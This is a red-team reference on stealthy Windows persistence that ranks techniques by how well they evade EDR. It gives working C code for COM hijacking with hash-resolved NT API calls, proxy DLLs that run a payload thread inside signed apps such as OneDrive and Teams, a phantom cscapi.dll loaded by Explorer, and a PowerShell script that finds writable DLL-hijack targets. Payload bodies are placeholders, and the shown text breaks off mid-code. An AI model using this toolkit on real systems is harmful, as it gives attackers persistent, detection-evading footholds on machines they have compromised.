# Persistence Mechanisms (High-OPSEC Only)

Reference for Windows persistence techniques that evade modern EDR. Only includes methods rated Low detection risk.

## Removed Techniques (High EDR Detection)

The following are **excluded** — all are heavily monitored by modern EDR/Sysmon and trigger immediate alerts:

- Registry Run/RunOnce keys — Sysmon Event 13 on known paths, every EDR monitors these
- Active Setup — HKLM Installed Components path is well-known
- IFEO (Image File Execution Options) — Debugger value is a top-priority EDR alert
- Winlogon Shell & Userinit — Critical key, immediate alert on modification
- AppInit_DLLs — Disabled by Secure Boot on Win8+, heavily monitored
- Scheduled Tasks (schtasks) — Security Event 4698, Sysmon Event 1, task XML audited
- Windows Service persistence — Security Event 4697, SCM API hooked by all EDR
- PATH Hijacking — Medium OPSEC, file creation in PATH dirs is monitored

---

## 1. COM Hijacking — HKCU InprocServer32

> OPSEC: Low
> Admin Required: No
> Sysmon: Event ID 13 (Registry Value Set) on HKCU\Software\Classes\CLSID — rarely triggers alerts
> ETW: Microsoft-Windows-Kernel-Registry (HKCU write only)
> EDR Detection: Most EDR do NOT alert on HKCU CLSID writes — too much legitimate noise
> Advantage: HKCU overrides HKLM; no admin needed; blends with legitimate COM registration
> Trigger: Any process that CoCreateInstance the hijacked CLSID
> Source: N/A (well-established technique, enhanced with high-frequency CLSIDs)

### Concept

Windows COM resolution checks `HKCU\Software\Classes\CLSID\{GUID}\InprocServer32` before `HKLM`. Writing a DLL path to HKCU for a frequently-loaded CLSID causes your DLL to load in place of (or proxying to) the legitimate one.

### High-Frequency Target CLSIDs (2024-2026)

| CLSID | Name | Loaded By | Frequency |
|-------|------|-----------|-----------|
| `{BCDE0395-E52F-467C-8E3D-C4579291692E}` | MMDeviceEnumerator | Explorer.exe, audio apps | Every login + continuous |
| `{4590F811-1D3A-11D0-891F-00AA004B2E24}` | WbemLocator | WMI consumers, many services | Very high |
| `{F56F6FDD-AA9D-4618-A949-C1B91AF43B1A}` | TaskbarPin | Explorer shell | Every login |
| `{00021401-0000-0000-C000-000000000046}` | ShellLink | Explorer, any .lnk access | Continuous |
| `{1f486a52-3cb1-48fd-8f50-b8dc300d9f9d}` | NetworkListManager | Explorer, network stack | Every login |

### Implementation — Registry Write via Indirect Syscall

```c
#include <windows.h>
#include <winternl.h>

// --- PEB Walk for ntdll base ---
typedef NTSTATUS(NTAPI* fnNtOpenKey)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
typedef NTSTATUS(NTAPI* fnNtSetValueKey)(HANDLE, PUNICODE_STRING, ULONG, ULONG, PVOID, ULONG);
typedef NTSTATUS(NTAPI* fnNtClose)(HANDLE);
typedef NTSTATUS(NTAPI* fnNtCreateKey)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, ULONG, PUNICODE_STRING, ULONG, PULONG);

// djb2 hash for API resolution
static DWORD HashStringA(const char* str) {
    DWORD hash = 5381;
    int c;
    while ((c = *str++))
        hash = ((hash << 5) + hash) + c;
    return hash;
}

// PEB walk to find ntdll.dll base
static HMODULE GetNtdllBase(void) {
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    PLIST_ENTRY pHead = &pPeb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY pEntry = pHead->Flink;
    while (pEntry != pHead) {
        PLDR_DATA_TABLE_ENTRY pMod = CONTAINING_RECORD(pEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        // ntdll.dll is always the second module (after the exe)
        if (pMod->FullDllName.Buffer) {
            // Simple check: ntdll.dll length and 'n' 't' chars
            PWCHAR name = pMod->FullDllName.Buffer;
            int len = pMod->FullDllName.Length / sizeof(WCHAR);
            for (int i = 0; i < len - 8; i++) {
                if ((name[i] | 0x20) == 'n' && (name[i+1] | 0x20) == 't' &&
                    (name[i+2] | 0x20) == 'd' && (name[i+3] | 0x20) == 'l' &&
                    (name[i+4] | 0x20) == 'l') {
                    return (HMODULE)pMod->DllBase;
                }
            }
        }
        pEntry = pEntry->Flink;
    }
    return NULL;
}

// Resolve export by hash from module base
static FARPROC GetProcByHash(HMODULE hModule, DWORD dwHash) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pExports = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule +
        pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* pNames = (DWORD*)((BYTE*)hModule + pExports->AddressOfNames);
    WORD* pOrdinals = (WORD*)((BYTE*)hModule + pExports->AddressOfNameOrdinals);
    DWORD* pFunctions = (DWORD*)((BYTE*)hModule + pExports->AddressOfFunctions);

    for (DWORD i = 0; i < pExports->NumberOfNames; i++) {
        char* szName = (char*)((BYTE*)hModule + pNames[i]);
        if (HashStringA(szName) == dwHash) {
            return (FARPROC)((BYTE*)hModule + pFunctions[pOrdinals[i]]);
        }
    }
    return NULL;
}

// Hashes (precomputed djb2):
// NtCreateKey  = 0x7B3C2E1A  (example — compute at build time)
// NtSetValueKey = 0x5E2D1F8B
// NtClose      = 0x3C1A0F5D

BOOL ComHijackInstall(LPCWSTR pwszClsid, LPCWSTR pwszDllPath) {
    HMODULE hNtdll = GetNtdllBase();
    if (!hNtdll) return FALSE;

    // Resolve via hash (replace with actual precomputed hashes)
    fnNtCreateKey pNtCreateKey = (fnNtCreateKey)GetProcByHash(hNtdll, 0x7B3C2E1A);
    fnNtSetValueKey pNtSetValueKey = (fnNtSetValueKey)GetProcByHash(hNtdll, 0x5E2D1F8B);
    fnNtClose pNtClose = (fnNtClose)GetProcByHash(hNtdll, 0x3C1A0F5D);

    if (!pNtCreateKey || !pNtSetValueKey || !pNtClose) return FALSE;

    // Build registry path: \Registry\User\<SID>\Software\Classes\CLSID\{...}\InprocServer32
    WCHAR wszPath[512];
    // Get current user SID string
    HANDLE hToken;
    OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);
    BYTE sidBuf[256];
    DWORD dwLen = sizeof(sidBuf);
    GetTokenInformation(hToken, TokenUser, sidBuf, dwLen, &dwLen);
    CloseHandle(hToken);

    LPWSTR pwszSid = NULL;
    ConvertSidToStringSidW(((TOKEN_USER*)sidBuf)->User.Sid, &pwszSid);

    swprintf_s(wszPath, 512,
        L"\\Registry\\User\\%s\\Software\\Classes\\CLSID\\%s\\InprocServer32",
        pwszSid, pwszClsid);
    LocalFree(pwszSid);

    // Open/Create key via NtCreateKey
    UNICODE_STRING usKeyPath;
    RtlInitUnicodeString(&usKeyPath, wszPath);

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &usKeyPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE hKey = NULL;
    ULONG ulDisposition = 0;
    NTSTATUS status = pNtCreateKey(&hKey, KEY_SET_VALUE, &oa, 0, NULL,
                                    REG_OPTION_NON_VOLATILE, &ulDisposition);
    if (!NT_SUCCESS(status)) return FALSE;

    // Set default value (empty name) = DLL path
    UNICODE_STRING usValueName;
    RtlInitUnicodeString(&usValueName, L"");
    DWORD cbData = (DWORD)((wcslen(pwszDllPath) + 1) * sizeof(WCHAR));
    pNtSetValueKey(hKey, &usValueName, 0, REG_SZ, (PVOID)pwszDllPath, cbData);

    // Set ThreadingModel = "Both"
    UNICODE_STRING usThreading;
    RtlInitUnicodeString(&usThreading, L"ThreadingModel");
    WCHAR wszBoth[] = L"Both";
    pNtSetValueKey(hKey, &usThreading, 0, REG_SZ, wszBoth, sizeof(wszBoth));

    pNtClose(hKey);
    return TRUE;
}

// Usage:
// ComHijackInstall(L"{BCDE0395-E52F-467C-8E3D-C4579291692E}",
//                  L"C:\\Users\\user\\AppData\\Roaming\\Microsoft\\mmdevapi.dll");
```

### Proxy DLL Template (Export Forwarding)

The proxy DLL forwards all original COM exports to the real DLL while executing payload on load:

```c
// proxy_com.c — COM Proxy DLL with payload execution
// Compile: cl /LD proxy_com.c /link /DEF:proxy_com.def /OUT:mmdevapi.dll

#include <windows.h>

// Original DLL handle (loaded at runtime)
static HMODULE g_hOriginal = NULL;
static BOOL    g_bPayloadRan = FALSE;

// Forward declarations for original exports
typedef HRESULT(WINAPI* pfnDllGetClassObject)(REFCLSID, REFIID, LPVOID*);
typedef HRESULT(WINAPI* pfnDllCanUnloadNow)(void);
typedef HRESULT(WINAPI* pfnDllRegisterServer)(void);
typedef HRESULT(WINAPI* pfnDllUnregisterServer)(void);

static pfnDllGetClassObject pOrigGetClassObject = NULL;
static pfnDllCanUnloadNow   pOrigCanUnloadNow   = NULL;

// Load the original DLL from System32
static BOOL LoadOriginalDll(void) {
    if (g_hOriginal) return TRUE;
    WCHAR wszPath[MAX_PATH];
    GetSystemDirectoryW(wszPath, MAX_PATH);
    wcscat_s(wszPath, MAX_PATH, L"\\mmdevapi.dll");
    g_hOriginal = LoadLibraryW(wszPath);
    if (!g_hOriginal) return FALSE;
    pOrigGetClassObject = (pfnDllGetClassObject)GetProcAddress(g_hOriginal, "DllGetClassObject");
    pOrigCanUnloadNow = (pfnDllCanUnloadNow)GetProcAddress(g_hOriginal, "DllCanUnloadNow");
    return TRUE;
}

// Payload execution (runs once via mutex)
static DWORD WINAPI PayloadThread(LPVOID lpParam) {
    // --- Insert shellcode loader / beacon callback here ---
    // Example: read encrypted shellcode from file, decrypt, execute
    UNREFERENCED_PARAMETER(lpParam);
    return 0;
}

static void RunPayloadOnce(void) {
    if (g_bPayloadRan) return;
    // Mutex prevents re-execution across multiple COM loads
    HANDLE hMutex = CreateMutexA(NULL, TRUE, "Global\\{a1b2c3d4-com-persist}");
    if (hMutex && GetLastError() != ERROR_ALREADY_EXISTS) {
        g_bPayloadRan = TRUE;
        CreateThread(NULL, 0, PayloadThread, NULL, 0, NULL);
    }
    if (hMutex) CloseHandle(hMutex);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    UNREFERENCED_PARAMETER(hModule);
    UNREFERENCED_PARAMETER(lpReserved);
    switch (dwReason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hModule);
            LoadOriginalDll();
            RunPayloadOnce();
            break;
        case DLL_PROCESS_DETACH:
            if (g_hOriginal) FreeLibrary(g_hOriginal);
            break;
    }
    return TRUE;
}

// Forwarded exports
__declspec(dllexport) HRESULT WINAPI DllGetClassObject(REFCLSID rclsid, REFIID riid, LPVOID* ppv) {
    if (!pOrigGetClassObject && !LoadOriginalDll()) return E_FAIL;
    return pOrigGetClassObject(rclsid, riid, ppv);
}

__declspec(dllexport) HRESULT WINAPI DllCanUnloadNow(void) {
    if (!pOrigCanUnloadNow && !LoadOriginalDll()) return S_FALSE;
    return pOrigCanUnloadNow();
}
```

**Module definition file (proxy_com.def):**
```def
LIBRARY mmdevapi
EXPORTS
    DllGetClassObject   @1
    DllCanUnloadNow     @2
    DllRegisterServer   @3
    DllUnregisterServer @4
```

---

## 2. DLL Sideloading

> OPSEC: Low
> Admin Required: No (user-writable app directories) / Yes (Program Files)
> Sysmon: Event ID 7 (Image Load) — but DLL loads from app directories are normal
> ETW: Microsoft-Windows-Kernel-File (file creation only)
> EDR Detection: Looks for unsigned DLLs in signed app directories; hash mismatch with known-good
> Advantage: No registry modification; runs in context of signed legitimate process; blends with normal app behavior
> Trigger: Target application launch (login, startup folder, user action)
> Source: N/A (well-established, targets updated for 2024-2026 app versions)

### Concept

Signed applications load DLLs from their own directory before System32 (DLL search order). Place a proxy DLL with the expected name in the application directory. The signed app loads your DLL, which forwards exports to the real DLL while executing payload.

### Common Sideloading Targets (2024-2026)

| Application | DLL Name | Path | Auto-starts |
|-------------|----------|------|-------------|
| OneDrive | version.dll | `%LOCALAPPDATA%\Microsoft\OneDrive\` | Yes (login) |
| Microsoft Teams | dbghelp.dll | `%LOCALAPPDATA%\Microsoft\Teams\current\` | Yes (login) |
| VS Code | winmm.dll | `%LOCALAPPDATA%\Programs\Microsoft VS Code\` | Often |
| Slack | winhttp.dll | `%LOCALAPPDATA%\slack\` | Yes (login) |
| Discord | ffmpeg.dll | `%LOCALAPPDATA%\Discord\app-*\` | Yes (login) |
| Notepad++ | SciLexer.dll | `C:\Program Files\Notepad++\` | Manual |
| 7-Zip | 7z.dll | `C:\Program Files\7-Zip\` | Manual |

### Proxy DLL Template — version.dll (OneDrive Sideload)

```c
// version_proxy.c — Proxy DLL for version.dll sideloading
// Compile: cl /LD version_proxy.c /link /DEF:version.def /OUT:version.dll
//
// All 17 exports of version.dll are forwarded to the real System32 copy.
// Payload executes once on DLL_PROCESS_ATTACH in a separate thread.

#include <windows.h>

#pragma comment(linker, "/export:GetFileVersionInfoA=version_orig.GetFileVersionInfoA")
#pragma comment(linker, "/export:GetFileVersionInfoByHandle=version_orig.GetFileVersionInfoByHandle")
#pragma comment(linker, "/export:GetFileVersionInfoExA=version_orig.GetFileVersionInfoExA")
#pragma comment(linker, "/export:GetFileVersionInfoExW=version_orig.GetFileVersionInfoExW")
#pragma comment(linker, "/export:GetFileVersionInfoSizeA=version_orig.GetFileVersionInfoSizeA")
#pragma comment(linker, "/export:GetFileVersionInfoSizeExA=version_orig.GetFileVersionInfoSizeExA")
#pragma comment(linker, "/export:GetFileVersionInfoSizeExW=version_orig.GetFileVersionInfoSizeExW")
#pragma comment(linker, "/export:GetFileVersionInfoSizeW=version_orig.GetFileVersionInfoSizeW")
#pragma comment(linker, "/export:GetFileVersionInfoW=version_orig.GetFileVersionInfoW")
#pragma comment(linker, "/export:VerFindFileA=version_orig.VerFindFileA")
#pragma comment(linker, "/export:VerFindFileW=version_orig.VerFindFileW")
#pragma comment(linker, "/export:VerInstallFileA=version_orig.VerInstallFileA")
#pragma comment(linker, "/export:VerInstallFileW=version_orig.VerInstallFileW")
#pragma comment(linker, "/export:VerLanguageNameA=version_orig.VerLanguageNameA")
#pragma comment(linker, "/export:VerLanguageNameW=version_orig.VerLanguageNameW")
#pragma comment(linker, "/export:VerQueryValueA=version_orig.VerQueryValueA")
#pragma comment(linker, "/export:VerQueryValueW=version_orig.VerQueryValueW")

static HMODULE g_hOrigVersion = NULL;

// --- Payload ---
static DWORD WINAPI PayloadThread(LPVOID lpParam) {
    UNREFERENCED_PARAMETER(lpParam);
    // Insert shellcode loader here
    // Example: XOR-decrypt shellcode from resource section, VirtualAlloc RWX, execute
    return 0;
}

static void ExecutePayload(void) {
    // Volume serial + process name based mutex for deduplication
    DWORD dwSerial = 0;
    GetVolumeInformationA("C:\\", NULL, 0, &dwSerial, NULL, NULL, NULL, 0);
    char szMutex[64];
    wsprintfA(szMutex, "Global\\%08X_vdll", dwSerial);

    HANDLE hMutex = CreateMutexA(NULL, TRUE, szMutex);
    if (hMutex && GetLastError() != ERROR_ALREADY_EXISTS) {
        CreateThread(NULL, 0, PayloadThread, NULL, 0, NULL);
    }
    if (hMutex) CloseHandle(hMutex);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    UNREFERENCED_PARAMETER(lpReserved);
    if (dwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);

        // Load original version.dll from System32 as "version_orig.dll"
        // The pragma linker directives above reference "version_orig" as the forwarding target
        WCHAR wszOrigPath[MAX_PATH];
        GetSystemDirectoryW(wszOrigPath, MAX_PATH);
        wcscat_s(wszOrigPath, MAX_PATH, L"\\version.dll");

        // Copy to local dir as version_orig.dll (or pre-deploy it)
        // Alternative: load directly and resolve at runtime
        g_hOrigVersion = LoadLibraryW(wszOrigPath);

        ExecutePayload();
    }
    else if (dwReason == DLL_PROCESS_DETACH) {
        if (g_hOrigVersion) FreeLibrary(g_hOrigVersion);
    }
    return TRUE;
}
```

**Alternative: .def file approach (version.def):**
```def
LIBRARY version
EXPORTS
    GetFileVersionInfoA        = version_orig.GetFileVersionInfoA
    GetFileVersionInfoByHandle = version_orig.GetFileVersionInfoByHandle
    GetFileVersionInfoExA      = version_orig.GetFileVersionInfoExA
    GetFileVersionInfoExW      = version_orig.GetFileVersionInfoExW
    GetFileVersionInfoSizeA    = version_orig.GetFileVersionInfoSizeA
    GetFileVersionInfoSizeExA  = version_orig.GetFileVersionInfoSizeExA
    GetFileVersionInfoSizeExW  = version_orig.GetFileVersionInfoSizeExW
    GetFileVersionInfoSizeW    = version_orig.GetFileVersionInfoSizeW
    GetFileVersionInfoW        = version_orig.GetFileVersionInfoW
    VerFindFileA               = version_orig.VerFindFileA
    VerFindFileW               = version_orig.VerFindFileW
    VerInstallFileA            = version_orig.VerInstallFileA
    VerInstallFileW            = version_orig.VerInstallFileW
    VerLanguageNameA           = version_orig.VerLanguageNameA
    VerLanguageNameW           = version_orig.VerLanguageNameW
    VerQueryValueA             = version_orig.VerQueryValueA
    VerQueryValueW             = version_orig.VerQueryValueW
```

### Deployment Steps

1. Copy real `version.dll` from `C:\Windows\System32\` to target app dir as `version_orig.dll`
2. Place compiled proxy `version.dll` in target app dir (e.g., `%LOCALAPPDATA%\Microsoft\OneDrive\`)
3. OneDrive auto-starts on login → loads your proxy → payload executes in OneDrive's signed context

---

## 3. Phantom DLL — cscapi.dll

> OPSEC: Low
> Admin Required: Yes (one-time write to System32)
> Sysmon: Event ID 7 (Image Load) for cscapi.dll — but this is expected by Windows
> ETW: Microsoft-Windows-Kernel-File (file creation in System32 — one-time event)
> EDR Detection: Very few EDR track "DLLs that should not exist"; cscapi.dll is in the import table of shell32.dll
> Advantage: No registry keys; no scheduled tasks; no services; loads in Explorer.exe context every login; Windows expects this DLL to exist
> Trigger: Every user login (Explorer.exe startup)
> Source: gavz/ExplorerPersist concept

### Concept

`explorer.exe` (via `shell32.dll`) attempts to load `cscapi.dll` (Client-Side Caching API) on every startup. On many Windows installations — particularly those without Offline Files enabled — this DLL does not exist in System32. Placing a DLL with this name in `C:\Windows\System32\` causes it to be loaded by Explorer on every login.

This is a "phantom DLL" — Windows expects it, tries to load it, but it is absent. Filling the gap is invisible to most monitoring.

### Implementation

```c
// cscapi_phantom.c — Phantom DLL persistence via cscapi.dll
// Compile: cl /LD cscapi_phantom.c /link /OUT:cscapi.dll
//
// Deploy: copy cscapi.dll C:\Windows\System32\cscapi.dll (requires admin once)
// Result: Explorer.exe loads this DLL on every user login

#include <windows.h>
#include <winternl.h>

// --- Indirect syscall stub for NtAllocateVirtualMemory ---
// Using PEB walk to avoid IAT entries for ntdll functions

typedef NTSTATUS(NTAPI* fnNtAllocateVirtualMemory)(
    HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits,
    PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
typedef NTSTATUS(NTAPI* fnNtProtectVirtualMemory)(
    HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize,
    ULONG NewProtect, PULONG OldProtect);

// PEB-based ntdll resolution (same pattern as COM hijack section)
static HMODULE GetNtdllViaPEB(void) {
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    PLIST_ENTRY pHead = &pPeb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY pEntry = pHead->Flink->Flink; // second entry = ntdll
    PLDR_DATA_TABLE_ENTRY pMod = CONTAINING_RECORD(pEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
    return (HMODULE)pMod->DllBase;
}

static FARPROC ResolveByHash(HMODULE hMod, DWORD dwHash) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hMod;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)hMod + pDos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hMod +
        pNt->OptionalHeader.DataDirectory[0].VirtualAddress);
    DWORD* names = (DWORD*)((BYTE*)hMod + pExp->AddressOfNames);
    WORD* ords = (WORD*)((BYTE*)hMod + pExp->AddressOfNameOrdinals);
    DWORD* funcs = (DWORD*)((BYTE*)hMod + pExp->AddressOfFunctions);
    for (DWORD i = 0; i < pExp->NumberOfNames; i++) {
        char* n = (char*)((BYTE*)hMod + names[i]);
        DWORD h = 5381;
        while (*n) { h = ((h << 5) + h) + *n; n++; }
        if (h == dwHash)
            return (FARPROC)((BYTE*)hMod + funcs[ords[i]]);
    }
    return NULL;
}

static DWORD WINAPI PayloadWorker(LPVOID lpParam) {
    UNREFERENCED_PARAMETER(lpParam);

    // Example: allocate memory and execute shellcode
    // In production, read encrypted payload from alternate data stream or registry blob
    HMODULE hNtdll = GetNtdllViaPEB();
    fnNtAllocateVirtualMemory pAlloc = (fnNtAllocateVirtualMemory)ResolveByHash(hNtdll, 0xE0762FEB);
    fnNtProtectVirtualMemory pProtect = (fnNtProtectVirtualMemory)ResolveByHash(hNtdll, 0xD1625F4A);

    if (!pAlloc || !pProtect) return 1;

    // --- Shellcode loading logic goes here ---
    // PVOID pBase = NULL;
    // SIZE_T sz = shellcode_len;
    // pAlloc((HANDLE)-1, &pBase, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    // memcpy(pBase, shellcode, shellcode_len);
    // ULONG ulOld;
    // pProtect((HANDLE)-1, &pBase, &sz, PAGE_EXECUTE_READ, &ulOld);
    // ((void(*)())pBase)();

    return 0;
}

// Exported functions that cscapi.dll is expected to have
// (minimal stubs — Explorer doesn't crash if they return failure)
__declspec(dllexport) DWORD WINAPI CscSearchApiGetInterface(void* p) {
    UNREFERENCED_PARAMETER(p);
    return 0; // ERROR_SUCCESS — no-op
}

__declspec(dllexport) DWORD WINAPI CscFindFirstFileW(void* a, void* b, void* c, void* d) {
    UNREFERENCED_PARAMETER(a); UNREFERENCED_PARAMETER(b);
    UNREFERENCED_PARAMETER(c); UNREFERENCED_PARAMETER(d);
    return 0xFFFFFFFF; // INVALID_HANDLE_VALUE equivalent
}

__declspec(dllexport) DWORD WINAPI CscFindNextFileW(void* a, void* b, void* c) {
    UNREFERENCED_PARAMETER(a); UNREFERENCED_PARAMETER(b); UNREFERENCED_PARAMETER(c);
    return 0; // No more files
}

__declspec(dllexport) BOOL WINAPI CscFindClose(void* a) {
    UNREFERENCED_PARAMETER(a);
    return TRUE;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    UNREFERENCED_PARAMETER(hModule);
    UNREFERENCED_PARAMETER(lpReserved);
    if (dwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);

        // Only execute in explorer.exe context
        WCHAR wszProc[MAX_PATH];
        GetModuleFileNameW(NULL, wszProc, MAX_PATH);
        if (wcsstr(wszProc, L"explorer.exe") == NULL)
            return TRUE; // Not our target process, just forward stubs

        // Mutex: one execution per login session
        DWORD dwSessionId = 0;
        ProcessIdToSessionId(GetCurrentProcessId(), &dwSessionId);
        char szMutex[64];
        wsprintfA(szMutex, "Local\\csc_%d", dwSessionId);

        HANDLE hMutex = CreateMutexA(NULL, TRUE, szMutex);
        if (hMutex && GetLastError() != ERROR_ALREADY_EXISTS) {
            CreateThread(NULL, 0, PayloadWorker, NULL, 0, NULL);
        }
        if (hMutex) CloseHandle(hMutex);
    }
    return TRUE;
}
```

### Deployment

```
# One-time (requires admin):
copy cscapi.dll C:\Windows\System32\cscapi.dll

# Verify it loads:
# Reboot or restart Explorer — Process Monitor will show cscapi.dll loaded by explorer.exe
```

### Verification (confirm target is viable)

Before deploying, confirm cscapi.dll is missing on the target:
```c
// Check if phantom DLL slot is available
HMODULE hTest = LoadLibraryW(L"cscapi.dll");
if (hTest == NULL) {
    // Slot is open — safe to deploy
} else {
    FreeLibrary(hTest);
    // DLL already exists — this system has Offline Files, pick another phantom
}
```

---

## 4. DLL Search Order Hijacking — Automated Discovery

> OPSEC: Low
> Admin Required: Depends on target directory (No for user-installed apps, Yes for Program Files)
> Sysmon: Event ID 7 (Image Load) — normal DLL load from application directory
> ETW: Microsoft-Windows-Kernel-File (file creation)
> EDR Detection: Looks for unsigned DLLs loaded by signed processes; hash deviation from baseline
> Advantage: No registry; no services; no tasks; runs as signed process; infinite targets available
> Trigger: Target application launch
> Source: georgesotiriadis/Chimera concept (automated discovery)

### Concept

Many signed applications attempt to load DLLs that don't exist in their directory, falling through the search order to System32. By placing a DLL with the expected name in the application's directory (which is searched first), the application loads your DLL instead.

The Chimera approach automates discovery: run Process Monitor, filter for `NAME NOT FOUND` results on `.dll` paths, and identify candidates where the application directory is writable.

### Automated Discovery Script

```powershell
# discover_sideload.ps1 — Find DLL hijack opportunities via Procmon
# Requires: Sysinternals Process Monitor (procmon64.exe)
# Run as admin for full visibility

param(
    [string]$ProcmonPath = "C:\Tools\Procmon64.exe",
    [string]$OutputCsv = "$env:TEMP\dll_hijack_candidates.csv",
    [int]$CaptureSeconds = 120
)

$BackingFile = "$env:TEMP\procmon_capture.pml"

# Configure Procmon filter: Result = NAME NOT FOUND, Path ends with .dll
$FilterConfig = @"
<ProcmonConfiguration>
  <FilterRules>
    <FilterRule>
      <Column>Result</Column>
      <Relation>is</Relation>
      <Action>Include</Action>
      <Value>NAME NOT FOUND</Value>
    </FilterRule>
    <FilterRule>
      <Column>Path</Column>
      <Relation>ends with</Relation>
      <Action>Include</Action>
      <Value>.dll</Value>
    </FilterRule>
    <FilterRule>
      <Column>Operation</Column>
      <Relation>is</Relation>
      <Action>Include</Action>
      <Value>CreateFile</Value>
    </FilterRule>
  </FilterRules>
</ProcmonConfiguration>
"@

$FilterPath = "$env:TEMP\procmon_filter.pmc"
$FilterConfig | Out-File -FilePath $FilterPath -Encoding UTF8

Write-Host "[*] Starting Process Monitor capture for $CaptureSeconds seconds..."
Start-Process -FilePath $ProcmonPath -ArgumentList "/Quiet /Minimized /BackingFile $BackingFile /LoadConfig $FilterPath" -NoNewWindow
Start-Sleep -Seconds $CaptureSeconds
Start-Process -FilePath $ProcmonPath -ArgumentList "/Terminate" -NoNewWindow -Wait

Write-Host "[*] Exporting results to CSV..."
Start-Process -FilePath $ProcmonPath -ArgumentList "/OpenLog $BackingFile /SaveAs $OutputCsv" -NoNewWindow -Wait
Start-Sleep -Seconds 5

# Parse results and find writable directories
$results = Import-Csv $OutputCsv | Where-Object {
    $_.'Result' -eq 'NAME NOT FOUND' -and
    $_.'Path' -match '\.dll$'
} | Select-Object 'Process Name', 'PID', 'Path' -Unique

Write-Host "`n[+] DLL Hijack Candidates:"
Write-Host "=" * 80

$candidates = @()
foreach ($r in $results) {
    $dllDir = Split-Path $r.Path -Parent
    $dllName = Split-Path $r.Path -Leaf

    # Check if directory is writable by current user
    $testFile = Join-Path $dllDir "write_test_$([guid]::NewGuid()).tmp"
    try {
        [IO.File]::WriteAllText($testFile, "test")
        Remove-Item $testFile -Force
        $writable = $true
    } catch {
        $writable = $false
    }

    # Check if the loading process is signed
    $procPath = (Get-Process -Id $r.PID -ErrorAction SilentlyContinue).Path
    $signed = $false
    if ($procPath) {
        $sig = Get-AuthenticodeSignature $procPath -ErrorAction SilentlyContinue
        $signed = ($sig.Status -eq 'Valid')
    }

    if ($writable -and $signed) {
        $candidates += [PSCustomObject]@{
            Process   = $r.'Process Name'
            DLL       = $dllName
            Directory = $dllDir
            Signed    = $signed
        }
        Write-Host "[+] $($r.'Process Name') -> $dllName (Dir: $dllDir) [WRITABLE + SIGNED]"
    }
}

$candidates | Export-Csv "$env:TEMP\confirmed_hijack_targets.csv" -NoTypeInformation
Write-Host "`n[*] Found $($candidates.Count) confirmed targets. Saved to $env:TEMP\confirmed_hijack_targets.csv"

# Cleanup
Remove-Item $BackingFile -Force -ErrorAction SilentlyContinue
Remove-Item $FilterPath -Force -ErrorAction SilentlyContinue
```

### Generic Proxy DLL Template (Search Order Hijack)

```c
// generic_proxy.c — Template for DLL search order hijacking
// Adapts to any target DLL by changing the forwarded exports
//
// Build process:
// 1. Run: dumpbin /exports C:\Windows\System32\<target>.dll > exports.txt
// 2. Generate pragma linker lines from export list
// 3. Compile: cl /LD generic_proxy.c /link /OUT:<target>.dll

#include <windows.h>

// ============================================================
// STEP 1: Generate these lines from the target DLL's export table
// Use the export_generator.py script below, or manually:
//   #pragma comment(linker, "/export:FuncName=real_target.FuncName")
// ============================================================

// Example for dbghelp.dll (Teams sideload):
#pragma comment(linker, "/export:MiniDumpWriteDump=dbghelp_orig.MiniDumpWriteDump")
#pragma comment(linker, "/export:SymInitialize=dbghelp_orig.SymInitialize")
#pragma comment(linker, "/export:SymCleanup=dbghelp_orig.SymCleanup")
#pragma comment(linker, "/export:SymFromAddr=dbghelp_orig.SymFromAddr")
#pragma comment(linker, "/export:SymSetOptions=dbghelp_orig.SymSetOptions")
#pragma comment(linker, "/export:SymGetOptions=dbghelp_orig.SymGetOptions")
#pragma comment(linker, "/export:StackWalk64=dbghelp_orig.StackWalk64")
#pragma comment(linker, "/export:UnDecorateSymbolName=dbghelp_orig.UnDecorateSymbolName")
#pragma comment(linker, "/export:SymLoadModuleEx=dbghelp_orig.SymLoadModuleEx")
#pragma comment(linker, "/export:SymGetModuleInfo64=dbghelp_orig.SymGetModuleInfo64")
// ... (generate full list from dumpbin output)

// ============================================================
// STEP 2: Payload
// ============================================================

static DWORD WINAPI Payload(LPVOID p) {
    UNREFERENCED_PARAMETER(p);
    // --- Your implant logic here ---
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    UNREFERENCED_PARAMETER(hModule);
    UNREFERENCED_PARAMETER(lpReserved);
    if (dwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);

        // Load the real DLL so forwarded exports resolve
        WCHAR wszReal[MAX_PATH];
